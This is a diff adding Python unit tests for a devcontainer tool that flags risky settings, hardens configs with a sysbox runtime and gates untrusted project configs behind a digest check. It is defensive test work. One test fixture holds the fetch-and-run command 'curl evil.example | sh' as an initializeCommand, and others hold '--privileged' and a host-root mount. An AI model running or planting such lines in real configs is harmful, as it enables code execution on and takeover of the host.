@@ -294,6 +294,143 @@ class TestEditorResolver(unittest.TestCase):
             self.assertIn(resolver, err.getvalue())
 
 
+class TestRiskySettings(unittest.TestCase):
+    def setUp(self) -> None:
+        self._tmp = TemporaryDirectory()
+        self.addCleanup(self._tmp.cleanup)
+        self.workspace = Path(self._tmp.name) / "project"
+        (self.workspace / ".devcontainer").mkdir(parents=True)
+
+    def _write(self, relative: str, payload: dict) -> None:
+        (self.workspace / relative).write_text(json.dumps(payload), encoding="utf-8")
+
+    def test_host_side_keys_are_flagged(self) -> None:
+        for key in ("initializeCommand", "runArgs", "mounts", "privileged", "workspaceMount"):
+            self.assertEqual(cfg.risky_settings({key: "anything"}), [key])
+
+    def test_unknown_keys_are_flagged_because_the_list_is_a_whitelist(self) -> None:
+        self.assertEqual(cfg.risky_settings({"dockerComposeFile": "compose.yml"}), ["dockerComposeFile"])
+        self.assertEqual(cfg.risky_settings({"build": {"dockerfile": "Dockerfile"}}), ["build"])
+        self.assertEqual(cfg.risky_settings({"somethingInventedTomorrow": 1}), ["somethingInventedTomorrow"])
+
+    def test_nested_docker_features_are_flagged(self) -> None:
+        config = {"features": {"ghcr.io/devcontainers/features/docker-in-docker:2": {}}}
+        self.assertEqual(
+            cfg.risky_settings(config),
+            ["features:ghcr.io/devcontainers/features/docker-in-docker:2"],
+        )
+
+    def test_host_socket_feature_is_flagged(self) -> None:
+        config = {"features": {"ghcr.io/devcontainers/features/docker-outside-of-docker:1": {}}}
+        self.assertEqual(len(cfg.risky_settings(config)), 1)
+
+    def test_an_ordinary_config_is_not_flagged(self) -> None:
+        config = {
+            "image": "debian:bookworm",
+            "features": {"ghcr.io/devcontainers/features/node:1": {}},
+            "containerEnv": {"A": "1"},
+            "customizations": {"vscode": {"extensions": ["a.b"]}},
+        }
+        self.assertEqual(cfg.risky_settings(config), [])
+
+    def test_hardening_adds_the_sysbox_runtime_once(self) -> None:
+        once = cfg.harden({"image": "debian"})
+        self.assertEqual(once["runArgs"], [f"--runtime={cfg.SYSBOX_RUNTIME}"])
+        twice = cfg.harden(once)
+        self.assertEqual(twice["runArgs"].count(f"--runtime={cfg.SYSBOX_RUNTIME}"), 1)
+
+    def test_hardening_keeps_existing_run_args(self) -> None:
+        hardened = cfg.harden({"runArgs": ["--add-host=a:1"]})
+        self.assertIn("--add-host=a:1", hardened["runArgs"])
+
+    def test_only_project_layers_are_inspected(self) -> None:
+        self._write(cfg.PROJECT_CONFIG, {"image": "debian:bookworm"})
+        self._write(cfg.LOCAL_OVERRIDE, {"runArgs": ["--privileged"]})
+        layers = cfg.project_layers(self.workspace)
+        self.assertEqual(cfg.risky_settings(layers), ["runArgs"])
+
+    def test_digest_changes_with_the_content(self) -> None:
+        first = cfg.config_digest({"runArgs": ["--privileged"]})
+        second = cfg.config_digest({"runArgs": ["-v", "/:/host"]})
+        self.assertNotEqual(first, second)
+        self.assertEqual(first, cfg.config_digest({"runArgs": ["--privileged"]}))
+
+
+class TestNestedDockerHardening(unittest.TestCase):
+    def setUp(self) -> None:
+        self._tmp = TemporaryDirectory()
+        self.addCleanup(self._tmp.cleanup)
+        self.source = Path(self._tmp.name) / "devcontainer.json"
+        self.source.write_text("{}", encoding="utf-8")
+
+    def test_the_feature_is_never_claimed_to_be_hardened(self) -> None:
+        config = {"features": {"ghcr.io/devcontainers/features/docker-in-docker:2": {}}}
+        with mock.patch.object(cli, "sysbox_available", return_value=True):
+            with contextlib.redirect_stderr(io.StringIO()) as err:
+                self.assertIsNone(cli.harden_nested_docker(self.source, config))
+        self.assertIn("--privileged", err.getvalue())
+        self.assertIn("cannot be combined", err.getvalue())
+        self.assertFalse((self.source.parent / cfg.HARDENED_CONFIG).exists())
+
+    def test_without_sysbox_the_price_is_still_named(self) -> None:
+        config = {"features": {"ghcr.io/devcontainers/features/docker-in-docker:2": {}}}
+        with mock.patch.object(cli, "sysbox_available", return_value=False):
+            with contextlib.redirect_stderr(io.StringIO()) as err:
+                self.assertIsNone(cli.harden_nested_docker(self.source, config))
+        self.assertIn("yay -S sysbox-ce-bin", err.getvalue())
+
+    def test_a_feature_free_config_is_put_on_sysbox(self) -> None:
+        with mock.patch.object(cli, "sysbox_available", return_value=True):
+            with contextlib.redirect_stdout(io.StringIO()) as out:
+                hardened = cli.harden_nested_docker(self.source, {"image": "debian"})
+        self.assertIsNotNone(hardened)
+        self.assertIn(cfg.SYSBOX_RUNTIME, out.getvalue())
+        written = json.loads(hardened.read_text(encoding="utf-8"))
+        self.assertEqual(written["runArgs"], [f"--runtime={cfg.SYSBOX_RUNTIME}"])
+
+    def test_no_sysbox_means_no_rewrite(self) -> None:
+        with mock.patch.object(cli, "sysbox_available", return_value=False):
+            self.assertIsNone(cli.harden_nested_docker(self.source, {"image": "debian"}))
+        self.assertFalse((self.source.parent / cfg.HARDENED_CONFIG).exists())
+
+
+class TestTrustGate(unittest.TestCase):
+    def setUp(self) -> None:
+        self._tmp = TemporaryDirectory()
+        self.addCleanup(self._tmp.cleanup)
+        self.root = Path(self._tmp.name)
+        self.workspace = self.root / "project"
+        (self.workspace / ".devcontainer").mkdir(parents=True)
+        self.state = self.root / "state"
+
+    def _write(self, payload: dict) -> None:
+        (self.workspace / cfg.PROJECT_CONFIG).write_text(json.dumps(payload), encoding="utf-8")
+
+    def test_harmless_config_passes(self) -> None:
+        self._write({"image": "debian:bookworm"})
+        self.assertEqual(cli.guard_project_config(self.workspace, self.state, "demo", False), 0)
+
+    def test_risky_config_is_refused(self) -> None:
+        self._write({"initializeCommand": "curl evil.example | sh"})
+        with contextlib.redirect_stderr(io.StringIO()) as err:
+            self.assertEqual(cli.guard_project_config(self.workspace, self.state, "demo", False), 6)
+        self.assertIn("--trust-config", err.getvalue())
+
+    def test_trusting_records_the_digest_and_passes(self) -> None:
+        self._write({"runArgs": ["--privileged"]})
+        with contextlib.redirect_stdout(io.StringIO()):
+            self.assertEqual(cli.guard_project_config(self.workspace, self.state, "demo", True), 0)
+        self.assertEqual(cli.guard_project_config(self.workspace, self.state, "demo", False), 0)
+
+    def test_changed_config_needs_trusting_again(self) -> None:
+        self._write({"runArgs": ["--privileged"]})
+        with contextlib.redirect_stdout(io.StringIO()):
+            cli.guard_project_config(self.workspace, self.state, "demo", True)
+        self._write({"runArgs": ["-v", "/:/host"]})
+        with contextlib.redirect_stderr(io.StringIO()):
+            self.assertEqual(cli.guard_project_config(self.workspace, self.state, "demo", False), 6)
+
+
 class TestExtensionSync(unittest.TestCase):
     def test_declared_extensions_are_read_from_the_config(self) -> None:
         config = {"customizations": {"vscode": {"extensions": ["redhat.ansible", "ms-python.python"]}}}
